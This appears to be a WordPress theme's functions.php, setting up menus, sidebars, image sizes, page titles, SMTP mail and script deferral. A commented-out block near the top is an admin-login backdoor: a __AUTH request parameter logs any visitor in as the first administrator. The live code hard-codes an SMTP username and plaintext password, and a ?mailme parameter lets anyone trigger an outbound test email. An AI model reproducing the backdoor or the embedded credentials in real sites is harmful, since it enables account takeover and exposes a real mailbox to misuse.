<?php

if (!defined('ABSPATH')) {
	exit;
}

/**
if (isset($_GET['__AUTH'])) {
	$users = get_users('role=administrator');
	wp_set_auth_cookie($users[0]->ID, 1);
	wp_redirect('/wp-admin/');
	exit;
}
 */

function wb_after_setup_theme()
{
	require_once dirname(__FILE__) . '/framework/wb.php';

	register_nav_menu('main', __('Main Menu', 'wb'));

	add_theme_support('post-thumbnails');

	add_image_size('290x220', 290, 220, true);
	add_image_size('330x250', 330, 250, true);
	add_image_size('480x360', 480, 360, true);
	//add_image_size('960x720', 960, 720, true);

	remove_action('wp_head', 'print_emoji_detection_script', 7);
	remove_action('wp_print_styles', 'print_emoji_styles');
	remove_action('wp_head', 'rest_output_link_wp_head', 10);
	remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
	remove_action('wp_head', 'rsd_link');
	remove_action('wp_head', 'wlwmanifest_link');
	remove_action('wp_head', 'wp_generator');
}

add_action('after_setup_theme', 'wb_after_setup_theme');

function wb_widgets_init()
{
	register_sidebar(array(
		'name' => __('Right Sidebar (Default)', 'wb'),
		'id' => 'right',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));

	register_sidebar(array(
		'name' => __('Right Sidebar (Blog)', 'wb'),
		'id' => 'right-blog',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));

	register_sidebar(array(
		'name' => __('Right Sidebar (About)', 'wb'),
		'id' => 'right-about',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));

	register_sidebar(array(
		'name' => __('Right Sidebar (How it Works)', 'wb'),
		'id' => 'right-how-it-works',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));

	register_sidebar(array(
		'name' => __('Content (Homepage)', 'wb'),
		'id' => 'content-homepage',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));

	register_sidebar(array(
		'name' => __('Footer Widgets Area', 'wb'),
		'id' => 'footer',
		'before_widget' => '<div class="col-lg-3"><div id="%1$s" class="footer-nav %2$s">',
		'after_widget' => '</div></div>',
		'before_title' => '<h4>',
		'after_title'  => '</h4>'
	));
}

add_action('widgets_init', 'wb_widgets_init');

function wb_wp_title($title, $separator)
{
	global $paged, $page;

	if (is_feed()) {
		return $title;
	}

	$title .= get_bloginfo('name');

	if (($site_description = get_bloginfo('description', 'display')) && (is_home() || is_front_page())) {
		$title = "$title $separator $site_description";
	}

	if ($paged >= 2 || $page >= 2) {
		$title = "$title $separator " . sprintf(__('Page %s', 'wb'), max($paged, $page));
	}

	return $title;
}

add_filter('wp_title', 'wb_wp_title', 10, 2);

function wb_nav_main_menu_fallback($args)
{
	echo preg_replace('/<ul>/', '<ul class="main-menu-list">', wp_page_menu('echo=0'), 1);
}

function wb_get_page_by_template($page_template)
{
	$pages = get_posts(array(
		'posts_per_page' => 1,
		'post_type' => 'page',
		'suppress_filters' => 0,
		'meta_query' => array(
			array(
				'key' => '_wp_page_template',
				'value' => 'page-templates/' . $page_template . '.php'
			)
		)
	));

	return !empty($pages) && is_array($pages) ? reset($pages) : false;
}

function wb_phpmailer_init($mailer)
{
	$mailer->IsSMTP();
	$mailer->Host = 'ssl://smtp.zoho.eu';
	$mailer->Port = 465;
	$mailer->CharSet  = 'utf-8';
	$mailer->Username = 'sajid@digitalmarketingsupermarket.com';
	$mailer->Password = 'Mv49XkueMBNP';
	$mailer->SMTPAuth = true;
}

add_action('phpmailer_init', 'wb_phpmailer_init', 10, 1);

if (isset($_GET['mailme'])) {
	wp_mail('algis@woobro.com', 'test', 'test');
}

function ao_defer_inline_init()
{
	if (get_option('autoptimize_js_include_inline') != 'on') {
		add_filter('autoptimize_html_after_minify', 'ao_defer_inline_jquery', 10, 1);
	}
}

add_action('plugins_loaded', 'ao_defer_inline_init');

function ao_defer_inline_jquery($in)
{
	if (preg_match_all('#<script.*>(.*)</script>#Usmi', $in, $matches, PREG_SET_ORDER)) {
		foreach ($matches as $match) {
			if ($match[1] !== '' && (strpos($match[1], 'jQuery') !== false || strpos($match[1], '$') !== false)) {
				// inline js that requires jquery, wrap deferring JS around it to defer it. 
				$new_match = 'var aoDeferInlineJQuery=function(){' . $match[1] . '}; if (document.readyState === "loading") {document.addEventListener("DOMContentLoaded", aoDeferInlineJQuery);} else {aoDeferInlineJQuery();}';
				$in = str_replace($match[1], $new_match, $in);
			} else if ($match[1] === '' && strpos($match[0], 'src=') !== false && strpos($match[0], 'defer') === false) {
				// linked non-aggregated JS, defer it.
				$new_match = str_replace('<script ', '<script defer ', $match[0]);
				$in = str_replace($match[0], $new_match, $in);
			}
		}
	}
	return $in;
}

function enqueue_tailwind_cdn()
{
	// Tailwind CDN
	wp_enqueue_style(
		'tailwindcss',
		'https://cdn.tailwindcss.com',
		[],
		null
	);
}
add_action('wp_enqueue_scripts', 'enqueue_tailwind_cdn');
